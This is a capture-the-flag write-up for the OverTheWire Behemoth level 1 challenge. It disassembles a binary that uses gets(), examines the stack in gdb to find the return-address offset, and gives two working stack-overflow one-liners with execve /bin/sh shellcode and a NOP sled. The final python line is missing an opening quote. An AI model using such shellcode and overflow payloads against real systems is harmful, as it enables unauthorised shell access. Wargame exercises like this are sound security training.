URL: http://www.overthewire.org/wargames/behemoth/behemoth1.shtml

Comment from me:
	- file is located at: /behemoth/behemoth1
	- debug using gdb
   
	   0x080483f4 <+0>:	push   %ebp
	   0x080483f5 <+1>:	mov    %esp,%ebp
	   0x080483f7 <+3>:	and    $0xfffffff0,%esp
	=> 0x080483fa <+6>:	sub    $0x60,%esp
	   0x080483fd <+9>:	mov    $0x80484f0,%eax
	   0x08048402 <+14>:	mov    %eax,(%esp)
	   0x08048405 <+17>:	call   0x8048320 <printf@plt>
	   0x0804840a <+22>:	lea    0x1d(%esp),%eax
	   0x0804840e <+26>:	mov    %eax,(%esp)
	   0x08048411 <+29>:	call   0x8048300 <gets@plt>
	   0x08048416 <+34>:	movl   $0x80484fc,(%esp)
	   0x0804841d <+41>:	call   0x8048330 <puts@plt>
	   0x08048422 <+46>:	mov    $0x0,%eax
	   0x08048427 <+51>:	leave  
	   0x08048428 <+52>:	ret  

	when try running it in gdb
	Password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

	Breakpoint 2, 0x08048416 in main ()
	(gdb) x/30wx $esp
	0xffffd6d0:	0xffffd6ed	0x000a0000	0x00010000	0xf7fd2ff4
	0xffffd6e0:	0xf7f80b19	0xf7ea2ab5	0xffffd6f8	0x61616165
	0xffffd6f0:	0x61616161	0x61616161	0x61616161	0x61616161
	0xffffd700:	0x61616161	0x61616161	0x61616161	0x61616161
	0xffffd710:	0x61616161	0x61616161	0x61616161	0x61616161
	0xffffd720:	0xf7006161	0xf7feed80	0x0804843b	0xf7fd2ff4
	0xffffd730:	0x08048430	0x00000000	0xffffd7b8	0xf7e89e37
	0xffffd740:	0x00000001	0xffffd7e4
	(gdb) 

	- $ebp = 0xffffd738   , have previous value of 0xffffd7b8
	- save EIP = 0xffffd73c
	- $esp = 0xffffd6d0

	- after call gets@plt, the address at 0xffffd6ec is replaced. This is the variable for gets()
	- $ebp is at 0xffffd738
	- ret is at 0xffffd73c
	- from 0xffffd6ec to 0xffffd73c is 80 chars long, and to override EIP needs 4 chars more

	#shellcode
	\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80

	#old EBP value (backward)
	\xb8\xd7\xff\xff

	#return address (backward)
	\xed\xd6\xff\xff

	Structure would be (total of 84)
	[NOP1 SHELLCODE NOP2 OLD_EBP NEW_EIP]

	total NOPs available is 84-(33+4+4) = 84 - 41 = 43
	"\x90"*43

	perl -e 'print "\x90"*43; print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80"; print "\xb8\xd7\xff\xff"; print "\xed\xd6\xff\xff";' | ./behemoth1

	python -c 'print "\x90"*48 + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" +"\xb8\xd7\xff\xff" + "\xed\xd6\xff\xff";' | ./behemoth1